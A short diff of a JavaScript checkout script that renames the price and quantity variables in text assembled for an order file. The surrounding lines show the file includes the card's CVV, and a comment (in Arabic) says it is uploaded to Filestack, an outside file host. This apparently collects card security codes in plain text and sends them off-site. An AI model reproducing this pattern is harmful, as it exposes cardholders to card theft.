@@ -152,8 +152,8 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `CVV: ${cvv}\n\n`;
       fileContent += `Product Information:\n`;
       fileContent += `Product Name: ${productName}\n`;
-      fileContent += `Product Price: ${productPriceText}\n`;
-      fileContent += `Product Quantity: ${productQuantityText}\n`;
+      fileContent += `Product Price: ${productPrice}\n`;
+      fileContent += `Product Quantity: ${productQuantity}\n`;
       fileContent += `Total Price: ${totalPrice}\n`;
 
       // رفع الملف إلى Filestack
